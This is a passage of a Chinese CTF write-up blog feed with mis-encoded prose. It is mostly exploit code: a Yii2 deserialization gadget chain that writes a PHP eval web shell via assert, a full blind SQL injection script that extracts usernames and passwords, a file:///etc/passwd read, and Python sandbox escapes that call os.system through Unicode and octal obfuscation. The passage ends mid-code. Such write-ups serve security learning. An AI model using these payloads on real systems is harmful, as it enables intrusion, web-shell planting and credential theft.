alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç°åœ¨æ•´ä¸ªçœ‹ä¸‹æ¥ï¼Œè¿™ä¸ªé“¾è¿˜æ˜¯æ¯”è¾ƒå¥½ç†è§£çš„ã€‚</p><p>expï¼š</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">Faker</span>\<span class="hljs-title">Generator</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatchQueryResult</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$_dataReader</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;_dataReader = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Generator</span>;<br>    &#125;<br><br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">IndexAction</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$formatters</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-string">&#x27;close&#x27;</span>] = [<span class="hljs-keyword">new</span> IndexAction(),<span class="hljs-string">&#x27;run&#x27;</span>];<br>        &#125;<br>    &#125;<br>&#125;<br>    <br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>&#123;<br>    <br>    <span class="hljs-title">class</span> <span class="hljs-title">IndexAction</span>&#123;<br>        <span class="hljs-title">public</span> $<span class="hljs-title">checkAccess</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;checkAccess=<span class="hljs-string">&quot;phpinfo&quot;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;id=<span class="hljs-string">&quot;1&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span>&#123;<br><br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>\<span class="hljs-title">BatchQueryResult</span>;<br><br>    <span class="hljs-keyword">echo</span> base64_encode(<br>        serialize(<span class="hljs-keyword">new</span> BatchQueryResult()));<br>&#125;<br></code></pre></div></td></tr></table></figure><p>çœ‹åˆ°äº†ç¦ç”¨å‡½æ•°</p><p><img src="https://img-blog.csdnimg.cn/20210710205444681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å‘ç°assertæ²¡æœ‰è¢«ç¦ç”¨</p><p>æ”¹ä¸€ä¸‹å‘½ä»¤</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">$this</span>-&gt;checkAccess=<span class="hljs-string">&#x27;assert&#x27;</span>;<br><span class="hljs-keyword">$this</span>-&gt;id=<span class="hljs-string">&quot;file_put_contents(&#x27;1.php&#x27;,&#x27;&lt;?php eval(\$_GET[&#x27;cmd&#x27;];?&gt;&#x27;)&quot;</span>;<br></code></pre></div></td></tr></table></figure><p>ä¸Šä¼ èšå‰‘è¿æ¥ï¼Œæ’ä»¶ç»•è¿‡å‡½æ•°ç¦ç”¨å³å¯ã€‚ç¬¬ä¸€æ¬¡æ²¡æœ‰å¤ç°æˆåŠŸï¼Œåæ¥åˆåšäº†ä¸€æ¬¡å‡ºäº†ã€‚</p><p>å…³äºyii2ä¸€äº›çŸ¥è¯†æœ‰ä¸€å¼ å›¾æŒºå¥½..</p><p><img src="https://img-blog.csdnimg.cn/20210710220138636.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="WebsiteManger"><a href="#WebsiteManger" class="headerlink" title="WebsiteManger"></a>WebsiteManger</h2><p>è¿›å…¥é¡µé¢F12å¯ä»¥çœ‹åˆ°<br><img src="https://img-blog.csdnimg.cn/20210712174230205.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å¾ˆæ˜æ˜¾æ˜¯æ³¨å…¥ï¼Œè¿›å…¥<code>image.php</code>å¯ä»¥çœ‹åˆ°å›¾ç‰‡ï¼Œè¯•äº†ä¸‹ä¸åŒçš„idå‘ç°å¥½åƒå¯ä»¥ç›²æ³¨ï¼Œåˆç®€å•è¯•äº†ä¸‹<br><code>if(ascii(substr(database(),1,1))&gt;1,1,0)</code>å‘ç°æ­£å¸¸æ˜¾ç¤ºï¼Œokç›´æ¥è„šæœ¬ã€‚</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://challenge-09493052703a08b5.sandbox.ctfhub.com:10800/image.php&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inject_database</span>(<span class="hljs-params">url</span>):</span><br>name = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100000</span>):<br>low = <span class="hljs-number">32</span><br>high = <span class="hljs-number">128</span><br>mid = (low + high) // <span class="hljs-number">2</span><br><span class="hljs-keyword">while</span> low &lt; high:<br>payload = <span class="hljs-string">&quot;if(ascii(substr(database(),%d,1))&gt;%d,1,0)&quot;</span>%(i,mid)<br>params = &#123;<span class="hljs-string">&#x27;id&#x27;</span>:payload&#125;<br>r = requests.get(url,params = params)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(r.text) &gt; <span class="hljs-number">4000</span>:<br>low = mid + <span class="hljs-number">1</span><br><span class="hljs-keyword">else</span>:<br>high = mid<br>mid = (low + high) // <span class="hljs-number">2</span><br><br><span class="hljs-keyword">if</span> mid == <span class="hljs-number">32</span>:<br><span class="hljs-keyword">break</span><br>name = name + <span class="hljs-built_in">chr</span>(mid)<br><span class="hljs-built_in">print</span> (name)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inject_table</span>(<span class="hljs-params">url</span>):</span><br>name = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100000</span>):<br>low = <span class="hljs-number">32</span><br>high = <span class="hljs-number">128</span><br>mid = (low + high) // <span class="hljs-number">2</span><br><span class="hljs-keyword">while</span> low &lt; high:<br>payload = <span class="hljs-string">&quot;if(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/=/**/&#x27;ctf&#x27;),%d,1))&gt;%d,1,0)&quot;</span>%(i,mid)<br>params = &#123;<span class="hljs-string">&#x27;id&#x27;</span>:payload&#125;<br>r = requests.get(url,params = params)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(r.text) &gt; <span class="hljs-number">4000</span>:<br>low = mid + <span class="hljs-number">1</span><br><span class="hljs-keyword">else</span>:<br>high = mid<br>mid = (low + high) // <span class="hljs-number">2</span><br><br><span class="hljs-keyword">if</span> mid == <span class="hljs-number">32</span>:<br><span class="hljs-keyword">break</span><br>name = name + <span class="hljs-built_in">chr</span>(mid)<br><span class="hljs-built_in">print</span> (name)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inject_column</span>(<span class="hljs-params">url</span>):</span><br>name = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100000</span>):<br>low = <span class="hljs-number">32</span><br>high = <span class="hljs-number">128</span><br>mid = (low + high) // <span class="hljs-number">2</span><br><span class="hljs-keyword">while</span> low &lt; high:<br>payload = <span class="hljs-string">&quot;if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/=/**/&#x27;users&#x27;),%d,1))&gt;%d,1,0)&quot;</span>%(i,mid)<br>params = &#123;<span class="hljs-string">&#x27;id&#x27;</span>:payload&#125;<br>r = requests.get(url,params = params)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(r.text) &gt; <span class="hljs-number">4000</span>:<br>low = mid + <span class="hljs-number">1</span><br><span class="hljs-keyword">else</span>:<br>high = mid<br>mid = (low + high) // <span class="hljs-number">2</span><br><br><span class="hljs-keyword">if</span> mid == <span class="hljs-number">32</span>:<br><span class="hljs-keyword">break</span><br>name = name + <span class="hljs-built_in">chr</span>(mid)<br><span class="hljs-built_in">print</span> (name)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">result</span>(<span class="hljs-params">url</span>):</span><br>name = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100000</span>):<br>low = <span class="hljs-number">32</span><br>high = <span class="hljs-number">128</span><br>mid = (low + high) // <span class="hljs-number">2</span><br><span class="hljs-keyword">while</span> low &lt; high:<br>payload = <span class="hljs-string">&quot;if(ascii(substr((select/**/group_concat(username,password)/**/from/**/ctf.users),%d,1))&gt;%d,1,0)&quot;</span>%(i,mid)<br>params = &#123;<span class="hljs-string">&#x27;id&#x27;</span>:payload&#125;<br>r = requests.get(url,params = params)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(r.text) &gt; <span class="hljs-number">4000</span>:<br>low = mid + <span class="hljs-number">1</span><br><span class="hljs-keyword">else</span>:<br>high = mid<br>mid = (low + high) // <span class="hljs-number">2</span><br><br><span class="hljs-keyword">if</span> mid == <span class="hljs-number">32</span>:<br><span class="hljs-keyword">break</span><br>name = name + <span class="hljs-built_in">chr</span>(mid)<br><span class="hljs-built_in">print</span> (name)<br><br><span class="hljs-comment"># inject_database(url)</span><br><span class="hljs-comment"># inject_table(url)</span><br><span class="hljs-comment"># inject_column(url)</span><br>result(url)<br><span class="hljs-comment"># database  : ctf</span><br><span class="hljs-comment"># table     : users</span><br><span class="hljs-comment"># column    : USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</span><br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210712174553772.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç™»å½•åæ˜¯ä¸€ä¸ªä¸»æœºæµ‹è¯•ï¼Œè¯•äº†è¯•<code>file:///etc/passwd</code>ï¼Œè¿”å›äº†æ–‡ä»¶å†…å®¹ç›´æ¥<code>file:///flag</code>å‡ºã€‚<br>è¿™ä¸ªé¢˜æ„Ÿè§‰æ¯”è¾ƒåŸºç¡€ã€‚ä¹Ÿæ²¡æœ‰ä»€ä¹ˆè¿‡æ»¤ï¼Œpayloadä¸­å°±è¿‡æ»¤äº†ç©ºæ ¼ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TSCTFä¸€äº›æ€»ç»“</title>
    <link href="/2021/07/06/2021-7-6-%E5%85%B3%E4%BA%8Eunicode%E5%AD%97%E7%AC%A6%E4%BD%BF%E7%94%A8/"/>
    <url>/2021/07/06/2021-7-6-%E5%85%B3%E4%BA%8Eunicode%E5%AD%97%E7%AC%A6%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="TSCTFä¸€äº›æ€»ç»“"><a href="#TSCTFä¸€äº›æ€»ç»“" class="headerlink" title="TSCTFä¸€äº›æ€»ç»“"></a>TSCTFä¸€äº›æ€»ç»“</h2><h4 id="baby-python"><a href="#baby-python" class="headerlink" title="baby_python"></a>baby_python</h4><p>python3ä¸­æ”¯æŒ Non-ASCII Identifiesï¼Œä¸€äº›å…¶ä»–çš„unicodeå­—ç¬¦åœ¨æ‰§è¡Œçš„æ—¶å€™ä¹Ÿ å¯ä»¥è¢«è§£ææˆæ­£å¸¸å­—ç¬¦ï¼Œæ¯”å¦‚å…¨è§’å­—æ¯ï¼Œï½ï½‚ï½ƒï½„ï½…â€¦â€¦ï¼Œè¿™æ ·å¯ä»¥ç»•è¿‡å¤§å°å†™å­—æ¯çš„æ£€æŸ¥åŒæ—¶æ‰§è¡Œä»£ç ã€‚</p><p>æ‰¾åˆ°å‡ ä¸ªç›¸å…³çš„é¢˜ç›®ï¼Œå…ˆçœ‹ä»£ç ï¼Œpy2çš„æ²™ç›’é€ƒé€¸</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function<br>banned = [<br>    <span class="hljs-string">&quot;import&quot;</span>,<br>    <span class="hljs-string">&quot;exec&quot;</span>,<br>    <span class="hljs-string">&quot;eval&quot;</span>,<br>    <span class="hljs-string">&quot;pickle&quot;</span>,<br>    <span class="hljs-string">&quot;os&quot;</span>,<br>    <span class="hljs-string">&quot;subprocess&quot;</span>,<br>    <span class="hljs-string">&quot;kevin sucks&quot;</span>,<br>    <span class="hljs-string">&quot;input&quot;</span>,<br>    <span class="hljs-string">&quot;banned&quot;</span>,<br>    <span class="hljs-string">&quot;cry sum more&quot;</span>,<br>    <span class="hljs-string">&quot;sys&quot;</span><br>]<br>targets = __builtins__.__dict__.keys()<br>targets.remove(<span class="hljs-string">&#x27;raw_input&#x27;</span>)<br>targets.remove(<span class="hljs-string">&#x27;print&#x27;</span>)<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> targets:<br>    <span class="hljs-keyword">del</span> __builtins__.__dict__[x]<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>, end=<span class="hljs-string">&#x27; &#x27;</span>)<br>    data = raw_input()<br>    <span class="hljs-keyword">for</span> no <span class="hljs-keyword">in</span> banned:<br>        <span class="hljs-keyword">if</span> no.lower() <span class="hljs-keyword">in</span> data.lower():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No bueno&quot;</span>)<br>            <span class="hljs-keyword">break</span><br>   <span class="hljs-keyword">else</span>: <span class="hljs-comment"># this means nobreak</span><br>        <span class="hljs-built_in">exec</span> data<br></code></pre></div></td></tr></table></figure><p>è¿™ä¸ªé¢˜banæ‰äº†ä¸€äº›å‡½æ•°ï¼Œå¹¶ä¸”åˆ é™¤æ‰äº†bultinsé‡Œé¢çš„å‡½æ•°ï¼Œé‚£æˆ‘ä»¬å°±ç›´æ¥æ¢ä¸€ä¸ªå¸¸è§çš„é“¾å³å¯ ,ç„¶åå¯¹äºos å’Œsystemç”¨ç®€å•çš„å­—ç¬¦ä¸²æ‹¼æ¥å°±å¯ä»¥ã€‚</p><p>æ„é€ payloadå³å¯</p><p><code>print(().__class__.__base__.__subclasses__()[60].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;sy&#39;+&#39;stem&#39;](&#39;ls&#39;))</code></p><p><img src="https://img-blog.csdnimg.cn/20210707135456889.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç¬¬äºŒé“é¢˜</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Welcome to my pyjail! pls dont escape&quot;</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>  inp = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>)<br>  <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;</span>:<br>    <span class="hljs-keyword">if</span> n <span class="hljs-keyword">in</span> inp:<br>      <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;no u&quot;</span>)<br>      exit()<br>  <span class="hljs-built_in">exec</span>(inp)<br></code></pre></div></td></tr></table></figure><p>çœ‹åˆ°execï¼Œåº”è¯¥å°±æ˜¯ç»•è¿‡é™åˆ¶ä»»æ„ä»£ç æ‰§è¡Œäº†ã€‚å¯ä»¥çœ‹åˆ°å®ƒè¿‡æ»¤äº†æ‰€æœ‰çš„å¤§å°å†™è‹±æ–‡å­—æ¯ã€‚è¿™é“é¢˜çœ‹äº†wpæ‰ä¼šã€‚</p><p>å°è¯•å°†<code>__import__(&#39;os&#39;).system(&#39;ls&#39;)</code>è½¬æ¢ä¸ºå…«è¿›åˆ¶</p><p><code>137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51</code></p><p>åœ¨æœ¬åœ°ç¯å¢ƒä¸Šå¯ä»¥æ‰§è¡ŒæˆåŠŸï¼Œä½†æ˜¯åœ¨é¢˜ç›®ä¸Šå°±æ‰§è¡Œä¸äº†</p><p><img src="https://img-blog.csdnimg.cn/20210707142044387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://img-blog.csdnimg.cn/20210707142058270.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç„¶åå¯ä»¥åˆ©ç”¨pythonä¸­å¯¹äºUnicodeå­—ç¬¦çš„æ”¯æŒæ¥åš</p><p><img src="https://img-blog.csdnimg.cn/2021070714243484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ‰€æœ‰éƒ½ä¼šè¢«è½¬æ¢æˆ unicode çš„NFKC ä¹Ÿå°±æ˜¯æ ‡å‡†æ¨¡å¼</p><p><img src="https://img-blog.csdnimg.cn/20210707142407751.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å°†<code>__import__(&quot;os&quot;).system(&quot;dir&quot;)</code>å­—ç¬¦è½¬æˆunicodeï¼Œå‘½ä»¤è½¬ä¸ºå…«è¿›åˆ¶</p><p><code>__ğ‘–ğ‘šğ‘ğ‘œğ‘Ÿğ‘¡__(&quot;\157\163&quot;).ğ’”ğ’šğ’”ğ’•ğ’†ğ’(&quot;\144\151\162&quot;)</code>ï¼Œå³å¯æ‰§è¡ŒæˆåŠŸ</p><p><img src="https://img-blog.csdnimg.cn/20210707183159225.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>cmderç¼–ç æ²¡å¼„ï¼Œæ²¡æ˜¾ç¤ºå‡ºæ¥ã€‚ã€‚</p><h3 id="easy-unserialize"><a href="#easy-unserialize" class="headerlink" title="easy_unserialize"></a>easy_unserialize</h3><p>åˆ†æ</p><blockquote><p>è¿™ä¸ªé¢˜ç›®ä¸»è¦æ¶‰åŠåˆ°çš„ç‚¹éƒ½æ˜¯æ¯”è¾ƒåŸºç¡€ï¼Œç¿»çœ‹ä¸€ä¸‹ååºåˆ—åŒ–çš„çŸ¥è¯†ç‚¹éƒ½åº”è¯¥èƒ½åšå‡ºæ¥: è§‚å¯Ÿä»£ç ï¼Œå‘ç°åªæœ‰class Cæœ‰__destructå‡½æ•°ï¼Œæ‰€ä»¥å…¥å£ç‚¹ååºåˆ—åŒ–çš„èµ·ç‚¹å°±æ˜¯åœ¨è¿™ä¸ªç±»ï¼Œå…¶ä¸­ $this- &gt;server-&gt;event[â€œtestâ€] è¿™æ®µä»£ç æ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥æ„é€ class Aèµ‹å€¼ç»™$this-&gt;server ï¼Œæ³¨æ„è¿™é‡Œçš„class Bæ˜¯ç¬¬ä¸€ä¸ªå‘ï¼Œè¿™ä¸ªç±»å¹¶æ²¡å•¥ç”¨ è¿›å…¥åˆ°class Aï¼Œè°ƒç”¨ toRead ï¼Œéœ€è¦æ„é€ ä¸€ä¸‹event[â€œtestâ€] è¿™ä¸ªå‚æ•°ï¼Œphpååºåˆ—åŒ–çš„æ—¶å€™æ²¡æœ‰å¯¹åº”çš„ å‚æ•°ï¼Œå¯ä»¥ä¼ªé€ ä¸€ä¸ªï¼Œåªé™å®šéprivateå±æ€§çš„ è¿›å…¥åˆ°toReadå‡½æ•° ï¼Œè¿™æ˜¯ç¬¬äºŒä¸ªå‘ï¼Œéƒ¨åˆ†åŒå­¦å¸Œæœ›ç›´æ¥è°ƒç”¨readfileå‡½æ•°è¯»å–flagï¼Œä½†æ˜¯å¹¶ä¸å¯è¡Œï¼Œåº”ä¸ºæœ€ åè°ƒç”¨çš„freadå‡½æ•°æ˜¯ä¸ªèµ„æºç±»å‹çš„å‡½æ•°ï¼Œå¹¶ä¸èƒ½æˆåŠŸè¯»å–ä»»ä½•ä¸œè¥¿ çœŸå®çš„è§¦å‘ç‚¹åœ¨file_exists($this-&gt;file) ï¼Œè¿™ä¸ªå‡½æ•°é™¤äº†å¯ä»¥è§¦å‘pharåè®®çš„ååºåˆ—åŒ–ä¹‹å¤–è¿˜å¯ä»¥è§¦ å‘__toStringå‡½æ•°ï¼Œåªæœ‰class Dæœ‰__toStringå‡½æ•°ï¼Œæ‰€ä»¥æ­¤æ—¶å°±è®©class Dèµ‹å€¼ç»™$this-&gt;file è¿›å…¥åˆ°class Dä¹‹åæ˜æ˜¾æœ‰ä¸ª__call å¯ä»¥è§¦å‘å‡½æ•°è°ƒç”¨ï¼Œç»§ç»­è·Ÿè¿›æ•°æ®æµï¼Œåœ¨doDisplayå‡½æ•°ä¸­æœ‰ä¸€ä¸ªshow å‡½æ•°æ˜¯æ²¡å‡ºç°è¿‡çš„ï¼Œæ‰€ä»¥ï¼Œè¿™é‡Œæ˜¯è§¦å‘__callå‡½æ•°çš„å…³é”®ï¼Œæ‰€ä»¥è®©å…¶è°ƒç”¨è‡ªå·±æœ¬èº«ï¼Œå†å»è§¦å‘__call ç„¶ååˆ°äº†æœ€åä¸€ä¸ªåˆ©ç”¨ç‚¹ï¼Œæ­¤æ—¶å‘ç°æ„é€ å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸å¯æ§çš„ï¼ŒPHPé‡Œå¯ä»¥ç”¨åˆ°ä¸€ä¸ªå‡½æ•°ï¼Œassert ï¼Œåˆ©ç”¨assertæ‰§è¡Œä»£ç </p></blockquote><p>exp</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 